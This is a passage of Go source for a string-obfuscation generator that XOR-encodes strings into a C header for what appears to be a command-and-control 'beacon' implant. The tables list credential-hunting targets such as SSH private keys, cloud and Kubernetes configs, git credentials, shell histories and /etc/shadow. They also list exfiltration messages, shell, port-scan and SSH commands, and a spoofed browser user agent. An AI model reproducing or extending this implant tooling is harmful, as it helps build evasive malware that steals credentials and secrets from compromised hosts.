	{name: "LX_PORT_OPEN", plain: "%-15s  %d/tcp    open\n", isWide: false},

	/* triage category names */
	{name: "LX_TCAT_SSHKEYS", plain: "SSH Keys", isWide: false},
	{name: "LX_TCAT_CLOUD", plain: "Cloud Credentials", isWide: false},
	{name: "LX_TCAT_GIT", plain: "Git", isWide: false},
	{name: "LX_TCAT_HISTORY", plain: "Shell History", isWide: false},
	{name: "LX_TCAT_ENV", plain: "Environment Files", isWide: false},
	{name: "LX_TCAT_DB", plain: "Databases", isWide: false},
	{name: "LX_TCAT_CERTS", plain: "Certificates", isWide: false},
	{name: "LX_TCAT_PASS", plain: "Passwords", isWide: false},
	{name: "LX_TCAT_TOKENS", plain: "Tokens", isWide: false},
	{name: "LX_TCAT_MISC", plain: "Misc Credentials", isWide: false},

	/* triage file patterns */
	{name: "LX_ID_RSA", plain: "id_rsa", isWide: false},
	{name: "LX_ID_ED25519", plain: "id_ed25519", isWide: false},
	{name: "LX_ID_ECDSA", plain: "id_ecdsa", isWide: false},
	{name: "LX_ID_DSA", plain: "id_dsa", isWide: false},
	{name: "LX_KNOWN_HOSTS", plain: "known_hosts", isWide: false},
	{name: "LX_AUTH_KEYS", plain: "authorized_keys", isWide: false},
	{name: "LX_SSH_DOTDIR", plain: ".ssh/", isWide: false},
	{name: "LX_SSH_DOTDIR2", plain: "/.ssh", isWide: false},
	{name: "LX_EXT_PEM", plain: ".pem", isWide: false},
	{name: "LX_EXT_KEY", plain: ".key", isWide: false},
	{name: "LX_AWS_CRED", plain: ".aws/credentials", isWide: false},
	{name: "LX_BOTO", plain: "/.boto", isWide: false},
	{name: "LX_KUBE_CONFIG", plain: ".kube/config", isWide: false},
	{name: "LX_DOCKER_CONFIG", plain: ".docker/config.json", isWide: false},
	{name: "LX_GITCONFIG", plain: ".gitconfig", isWide: false},
	{name: "LX_GIT_CREDS", plain: ".git-credentials", isWide: false},
	{name: "LX_BASH_HISTORY", plain: ".bash_history", isWide: false},
	{name: "LX_ZSH_HISTORY", plain: ".zsh_history", isWide: false},
	{name: "LX_SH_HISTORY", plain: ".sh_history", isWide: false},
	{name: "LX_FISH_HISTORY", plain: ".fish_history", isWide: false},
	{name: "LX_DOT_ENV", plain: ".env", isWide: false},
	{name: "LX_EXT_SQL", plain: ".sql", isWide: false},
	{name: "LX_EXT_DB", plain: ".db", isWide: false},
	{name: "LX_EXT_SQLITE", plain: ".sqlite", isWide: false},
	{name: "LX_EXT_SQLITE3", plain: ".sqlite3", isWide: false},
	{name: "LX_EXT_CRT", plain: ".crt", isWide: false},
	{name: "LX_EXT_P12", plain: ".p12", isWide: false},
	{name: "LX_EXT_PFX", plain: ".pfx", isWide: false},
	{name: "LX_ETC_SHADOW", plain: "/etc/shadow", isWide: false},
	{name: "LX_HTPASSWD", plain: ".htpasswd", isWide: false},
	{name: "LX_NPMRC", plain: ".npmrc", isWide: false},
	{name: "LX_PYPIRC", plain: ".pypirc", isWide: false},
	{name: "LX_NETRC", plain: ".netrc", isWide: false},

	/* filebrowser JSON type strings */
	{name: "LX_FB_TYPE_DIR", plain: "dir", isWide: false},
	{name: "LX_FB_TYPE_LINK", plain: "link", isWide: false},
	{name: "LX_FB_TYPE_CHAR", plain: "char", isWide: false},
	{name: "LX_FB_TYPE_BLOCK", plain: "block", isWide: false},
	{name: "LX_FB_TYPE_PIPE", plain: "pipe", isWide: false},
	{name: "LX_FB_TYPE_SOCKET", plain: "socket", isWide: false},
	{name: "LX_FB_TYPE_FILE", plain: "file", isWide: false},

	/* HOME env var name */
	{name: "LX_ENV_HOME", plain: "HOME", isWide: false},
}

// EncodeNarrow XOR-encodes a narrow (ASCII/UTF-8) string.
func EncodeNarrow(plain string) []byte {
	b := []byte(plain)
	out := make([]byte, len(b))
	for i, c := range b {
		out[i] = c ^ xorKey[i%KeyLen]
	}
	return out
}

// DecodeNarrow reverses EncodeNarrow (XOR is its own inverse).
func DecodeNarrow(enc []byte) string {
	return string(EncodeNarrow(string(enc)))
}

// EncodeWide XOR-encodes a string as UTF-16LE bytes.
// Returns encoded bytes and the wchar_t count (not byte count).
func EncodeWide(plain string) ([]byte, int) {
	u16 := utf16.Encode([]rune(plain))
	buf := make([]byte, len(u16)*2)
	for i, w := range u16 {
		buf[2*i] = byte(w&0xFF) ^ xorKey[(2*i)%KeyLen]
		buf[2*i+1] = byte(w>>8) ^ xorKey[(2*i+1)%KeyLen]
	}
	return buf, len(u16)
}

// DecodeWide reverses EncodeWide.
func DecodeWide(enc []byte, wlen int) string {
	u16 := make([]uint16, wlen)
	for i := range u16 {
		lo := enc[2*i] ^ xorKey[(2*i)%KeyLen]
		hi := enc[2*i+1] ^ xorKey[(2*i+1)%KeyLen]
		u16[i] = uint16(lo) | uint16(hi)<<8
	}
	return string(utf16.Decode(u16))
}

func commentLiteral(s string) string {
	return strconv.Quote(s)
}

// linuxRequiredEntries lists entries needed by the Linux beacon.
// All other entries are skipped when platform == "linux".
var linuxRequiredEntries = map[string]bool{
	"SERVER_HOST":        true,
	"USER_AGENT":         true,
	"PATH_PUBKEY":        true,
	"PATH_REGISTER":      true,
	"PATH_CHECKIN":       true,
	"PATH_RESULT":        true,
	"CONTENT_TYPE":       true,
	"HTTP_POST":          true,
	"HTTP_GET":           true,
	"CRYPTO_AES_CBC":     true,
	"CRYPTO_HMAC_SHA256": true,
	"BIN_BASH":           true,
	"BIN_SH":             true,
	"SHELL_STARTED":      true,
	"SHELL_EXITED":       true,
	"UNKNOWN_TASK":       true,

	/* builtin command names */
	"CMD_WHOAMI": true, "CMD_ID": true, "CMD_HOSTNAME": true,
	"CMD_PWD": true, "CMD_ENV": true, "CMD_PS": true,
	"CMD_IPCONFIG": true, "CMD_IFCONFIG": true, "CMD_NETSTAT": true,
	"CMD_LS": true, "CMD_LS_BARE": true, "CMD_LS_SP": true,
	"CMD_CD": true, "CMD_CD_BARE": true, "CMD_CD_SP": true,
	"CMD_CAT": true, "CMD_MKDIR": true, "CMD_RM": true,
	"CMD_CP": true, "CMD_MV": true, "CMD_CHMOD": true,
	"CMD_GETENV": true, "CMD_KILL": true,
	"CMD_PORTSCAN": true, "CMD_CURL": true, "CMD_SSH": true,
	"CMD_TRIAGE": true, "CMD_TRIAGE_SP": true,
	"CMD_FILEBROWSER": true, "CMD_FILEBROWSER_BARE": true,
	"SHELL_PREFIX": true,

	/* Linux http/exec/main */
	"LX_HTTP_REQ_LINE": true, "LX_HOST_HDR": true,
	"LX_UA_HDR": true, "LX_CT_HDR": true,
	"LX_CL_HDR": true, "LX_CONN_CLOSE": true,
	"LX_CONTENT_LENGTH": true, "LX_DASH_C": true,
	"LX_EXEC_EMPTY": true, "LX_FORK_FAILED": true,
	"LX_CMD_TIMEOUT": true, "LX_FORK_PIPE_ERR": true,
	"LX_PROC_SELF_EXE": true, "LX_TASK_UNSUP": true,
	"LX_EXITING": true, "LX_SLEEP_UPDATED": true,

	/* Linux crypto/transfer */
	"LX_EXFIL_ERR_OPEN": true, "LX_EXFIL_ERR_STAT": true,
	"LX_EXFIL_ERR_READ": true, "LX_STAGE_ERR_CREATE": true,

	/* Linux builtin.c */
	"LX_RM_RF_SP": true, "LX_RM_FR_SP": true, "LX_RM_R_SP": true,
	"LX_RM_R": true, "LX_RM_RF": true, "LX_RM_FR": true,
	"LX_COPIED_COLON": true,
	"LX_PROC":         true, "LX_PROC_PID_STAT": true, "LX_PROC_PID_STATUS": true,
	"LX_PROC_PID_CMDLINE": true, "LX_PROC_PID_FD": true,
	"LX_PROC_PID_FD_ENT": true, "LX_PROC_PID_COMM": true,
	"LX_PROC_NET_TCP": true, "LX_PROC_NET_TCP6": true,
	"LX_PROC_NET_UDP": true, "LX_PROC_NET_UDP6": true,
	"LX_SOCKET_INODE": true, "LX_SYS_NET_ADDR": true,
	"LX_SYS": true, "LX_DEV": true, "LX_RUN": true,
	"LX_HOME": true, "LX_ROOT": true,
	"LX_UID_NL": true, "LX_UID_BARE": true,
	"LX_HOSTNAME_LABEL": true, "LX_KERNEL_LABEL": true, "LX_GETCWD_ERR": true,
	"LX_USAGE_GETENV": true, "LX_USAGE_MKDIR": true, "LX_USAGE_CHMOD": true,
	"LX_USAGE_KILL": true, "LX_USAGE_RM": true, "LX_USAGE_CP": true,
	"LX_USAGE_MV": true, "LX_USAGE_CAT": true, "LX_USAGE_SSH": true,
	"LX_USAGE_CURL": true, "LX_USAGE_PORTSCAN": true, "LX_USAGE_PORTSCAN2": true,
	"LX_CD_ERR": true, "LX_NOT_SET": true,
	"LX_MKDIR_ERR": true, "LX_CREATED": true,
	"LX_CHMOD_INVAL": true, "LX_CHMOD_ERR": true, "LX_CHMOD_OK": true,
	"LX_KILL_INVAL_SIG": true, "LX_KILL_INVAL_PID": true,
	"LX_KILL_PERM": true, "LX_KILL_NOSUCH": true,
	"LX_KILL_ERR": true, "LX_KILLED": true,
	"LX_PS_MALLOC": true, "LX_PS_OPENPROC": true,
	"LX_LS_GETCWD": true, "LX_LS_ERR": true,
	"LX_CAT_ERR": true, "LX_CAT_TOOLARGE": true,
	"LX_RM_ERR": true, "LX_RM_ISDIR": true, "LX_RM_PARTIAL": true,
	"LX_REMOVED": true,
	"LX_CP_ERR":  true, "LX_CP_FSTAT_ERR": true, "LX_CP_WRITE_ERR": true,
	"LX_COPIED": true, "LX_MOVED": true,
	"LX_MV_ERR": true, "LX_MV_XDEV": true,
	"LX_IFCONFIG_ERR":   true,
	"LX_PORTSCAN_INVAL": true, "LX_SCAN_COMPLETE": true,
	"LX_TRIAGE_FOUND":  true,
	"LX_CURL_NO_HTTPS": true, "LX_CURL_INVAL_URL": true,
	"LX_CURL_RESOLVE": true, "LX_CURL_SOCKET": true,
	"LX_CURL_CONNECT": true, "LX_CURL_SEND_ERR": true,
	"LX_HTTP_GET_REQ": true, "LX_HTTP_PREFIX": true, "LX_HTTPS_PREFIX": true,
	"LX_SSH_CMD": true, "LX_SSH_OPT_O": true,
	"LX_SSH_STRICTHOST": true, "LX_SSH_BATCH": true, "LX_SSH_TIMEOUT": true,
	"LX_SSH_PIPE_ERR": true, "LX_SSH_FORK_ERR": true,
	"LX_INET": true, "LX_INET6": true, "LX_ETHER": true,
	"LX_FLAGS": true, "LX_FLAG_UP": true, "LX_FLAG_RUNNING": true,
	"LX_FLAG_LOOP":   true,
	"LX_NETSTAT_HDR": true, "LX_NETSTAT_LOCAL": true,
	"LX_NETSTAT_REMOTE": true, "LX_NETSTAT_STATE": true,
	"LX_NETSTAT_PID": true, "LX_NETSTAT_PROC": true,
	"LX_PROTO_TCP": true, "LX_PROTO_TCP6": true,
	"LX_PROTO_UDP": true, "LX_PROTO_UDP6": true,
	"LX_ST_ESTABLISHED": true, "LX_ST_SYN_SENT": true,
	"LX_ST_SYN_RECV": true, "LX_ST_FIN_WAIT1": true,
	"LX_ST_FIN_WAIT2": true, "LX_ST_TIME_WAIT": true,
	"LX_ST_CLOSE": true, "LX_ST_CLOSE_WAIT": true,
	"LX_ST_LAST_ACK": true, "LX_ST_LISTEN": true,
	"LX_ST_CLOSING": true, "LX_ST_UNKNOWN": true,
	"LX_PS_HDR_PID": true, "LX_PS_HDR_PPID": true,
	"LX_PS_HDR_USER": true, "LX_PS_HDR_STATE": true,
	"LX_PS_HDR_CMD":   true,
	"LX_PORT_OPEN":    true,
	"LX_TCAT_SSHKEYS": true, "LX_TCAT_CLOUD": true,
	"LX_TCAT_GIT": true, "LX_TCAT_HISTORY": true,
	"LX_TCAT_ENV": true, "LX_TCAT_DB": true,
	"LX_TCAT_CERTS": true, "LX_TCAT_PASS": true,
	"LX_TCAT_TOKENS": true, "LX_TCAT_MISC": true,
	"LX_ID_RSA": true, "LX_ID_ED25519": true,
	"LX_ID_ECDSA": true, "LX_ID_DSA": true,
	"LX_KNOWN_HOSTS": true, "LX_AUTH_KEYS": true,
	"LX_SSH_DOTDIR": true, "LX_SSH_DOTDIR2": true,
	"LX_EXT_PEM": true, "LX_EXT_KEY": true,
	"LX_AWS_CRED": true, "LX_BOTO": true,
	"LX_KUBE_CONFIG": true, "LX_DOCKER_CONFIG": true,
	"LX_GITCONFIG": true, "LX_GIT_CREDS": true,
	"LX_BASH_HISTORY": true, "LX_ZSH_HISTORY": true,
	"LX_SH_HISTORY": true, "LX_FISH_HISTORY": true,
	"LX_DOT_ENV": true,
	"LX_EXT_SQL": true, "LX_EXT_DB": true,
	"LX_EXT_SQLITE": true, "LX_EXT_SQLITE3": true,
	"LX_EXT_CRT": true, "LX_EXT_P12": true, "LX_EXT_PFX": true,
	"LX_ETC_SHADOW": true, "LX_HTPASSWD": true,
	"LX_NPMRC": true, "LX_PYPIRC": true, "LX_NETRC": true,
	"LX_FB_TYPE_DIR": true, "LX_FB_TYPE_LINK": true,
	"LX_FB_TYPE_CHAR": true, "LX_FB_TYPE_BLOCK": true,
	"LX_FB_TYPE_PIPE": true, "LX_FB_TYPE_SOCKET": true,
	"LX_FB_TYPE_FILE": true,
	"LX_ENV_HOME":     true,
}

const linuxUserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
const linuxContentType = "application/octet-stream"

// Generate writes beacon/include/obf_strings.h to outDir.
// host is substituted for the SERVER_HOST entry.
// platform: "windows" (default), "linux". Linux builds use a subset of
// entries, all narrow (no wide strings), with a Linux User-Agent.
func Generate(host, outDir, platform string) error {
	if host == "" {
		return fmt.Errorf("obfgen.Generate: host must not be empty")
	}
	if platform == "" {
		platform = "windows"
	}
	var sb strings.Builder
	sb.WriteString("/* AUTO-GENERATED by gen_obf - DO NOT EDIT */\n#pragma once\n\n")

	for _, e := range baseEntries {
		if platform == "linux" && !linuxRequiredEntries[e.name] {
			continue
		}

		plain := e.plain
		isWide := e.isWide
		if e.name == "SERVER_HOST" {
			plain = host
		}

		if platform == "linux" {
			isWide = false
			if e.name == "USER_AGENT" {
				plain = linuxUserAgent
			}
			if e.name == "CONTENT_TYPE" {
				plain = linuxContentType
			}
		}

		var enc []byte
		var length int
		if isWide {
			enc, length = EncodeWide(plain)
			fmt.Fprintf(&sb, "/* %s (wide): L%s */\n", e.name, commentLiteral(plain))
		} else {
			enc = EncodeNarrow(plain)
			length = len(plain)
			fmt.Fprintf(&sb, "/* %s: %s */\n", e.name, commentLiteral(plain))
		}

		fmt.Fprintf(&sb, "static const unsigned char ENC_%s[] = {", e.name)
		for i, b := range enc {
			if i > 0 {
				sb.WriteByte(',')
			}
			fmt.Fprintf(&sb, " 0x%02X", b)
		}
		sb.WriteString(" };\n")
		fmt.Fprintf(&sb, "#define ENC_%s_LEN %d\n\n", e.name, length)
	}

	return os.WriteFile(filepath.Join(outDir, "obf_strings.h"), []byte(sb.String()), 0644)
}
